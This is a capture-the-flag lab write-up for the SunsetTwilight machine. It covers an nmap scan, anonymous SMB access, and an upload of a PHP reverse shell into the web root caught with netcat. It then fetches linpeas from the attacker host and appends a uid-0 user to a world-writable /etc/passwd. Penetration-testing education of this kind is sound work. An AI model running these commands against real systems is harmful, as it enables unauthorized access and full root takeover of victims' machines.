# SunsetTwilight

## Nmap

```
sudo nmap 192.168.120.91 -p- -sS -sV                                                                

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp        Exim smtpd
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
8080/tcp  open  http        PHP cli server 5.5 or later
63525/tcp open  http        PHP cli server 5.5 or later
Service Info: Host: TWILIGHT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First up is checking SMB. We are able to connect and list shared without providing credentials as shown below:

```
smbclient -U '' -L \\\\192.168.120.91\\ 
```

![](<../../../.gitbook/assets/image (1090).png>)

We can then move into the WRKSHARE directory to view the contents:

```
smbclient -U '' \\\\192.168.120.91\\WRKSHARE\\
```

![](<../../../.gitbook/assets/image (1091).png>)

As this looks like we can see the entire directory from '/' we can have a look about for interesting information. We know that port 80 is open so likely we are running a webserver.

Looking at the contents of the directory /var/www/html/ we can see PHP files.

![](<../../../.gitbook/assets/image (1092).png>)

If we can upload a reverse PHP shell we should in theory be able to get shell access. I used the following command to upload a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with curl into the /var/www/html directory:

```
curl --upload-file /home/kali/scripts/phpshell.php -u '' smb://192.168.120.91/WRKSHARE/var/www/html/phpshell.php
```

![](<../../../.gitbook/assets/image (1093).png>)

Checking the directory contents with `smbclient` again shows we have uploaded our PHP reverse shell.

![](<../../../.gitbook/assets/image (1094).png>)

We can then set a `netcat` listener up then execute the shell with `curl`.

```
sudo nc -lvp 80
curl http://192.168.120.91/phpshell.php 
```

![](<../../../.gitbook/assets/image (1095) (1).png>)

The current shell can then be improved by:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](<../../../.gitbook/assets/image (1096) (1).png>)

Next we can move into the /tmp/ directory. Started a `Python SimpleHTTPServer` on my attacking machine and transferred over `linpeas`.

```
wget http://192.168.49.120/linpeas.sh
```

`linpeas` picks up that /etc/passwd is writeable by everyone. Which means we can make changes to the file.

![](<../../../.gitbook/assets/image (1097).png>)

As such we can add a new root user to the target machine to gain root access.

Generate password on attacking machine:

```
openssl passwd -1 -salt password password 
```

Echo the password and new user to the end of /etc/passwd on the target machine.

```
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
```

We can then use `su` to move into the new account and gain a root shell.

![](<../../../.gitbook/assets/image (1098).png>)
